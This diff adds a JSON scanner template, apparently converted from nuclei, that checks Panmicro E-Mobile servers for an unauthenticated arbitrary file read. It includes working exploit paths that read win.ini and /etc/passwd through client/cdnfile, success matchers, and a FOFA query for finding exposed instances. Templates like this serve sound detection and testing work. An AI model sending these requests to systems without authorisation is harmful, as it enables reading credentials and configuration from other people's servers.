@@ -1,0 +1,125 @@
+{
+  "id": "panmicro-arbitrary-file-read",
+  "name": "Panmicro E-Mobile System - Arbitrary File Read",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability. Unauthenticated attackers can use this vulnerability to read important system files, database configuration files, and so on.\n",
+  "references": [
+    "http://cn-sec.com/archives/3182931.html",
+    "https://cn-sec.com/archives/3188605.html"
+  ],
+  "tags": [
+    "panmicro",
+    "e-mobile",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"泛微-EMobile\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body,\"bit app support\",\"fonts\",\"extensions\") || regex(\"root:.*:0:0:\", body)",
+            "contains_any(header,\"application/octet-stream\", \"text/plain\")",
+            "contains(header,\" attachment; filename\u003d\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "panmicro-arbitrary-file-read",
+    "info": {
+      "name": "Panmicro E-Mobile System - Arbitrary File Read",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability. Unauthenticated attackers can use this vulnerability to read important system files, database configuration files, and so on.\n",
+      "reference": [
+        "http://cn-sec.com/archives/3182931.html",
+        "https://cn-sec.com/archives/3188605.html"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"泛微-EMobile\""
+      },
+      "tags": "panmicro,e-mobile,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows",
+          "{{BaseURL}}/client/cdnfile/C/etc/passwd?linux"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body,\"bit app support\",\"fonts\",\"extensions\") || regex(\"root:.*:0:0:\", body)",
+              "contains_any(header,\"application/octet-stream\", \"text/plain\")",
+              "contains(header,\" attachment; filename\u003d\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
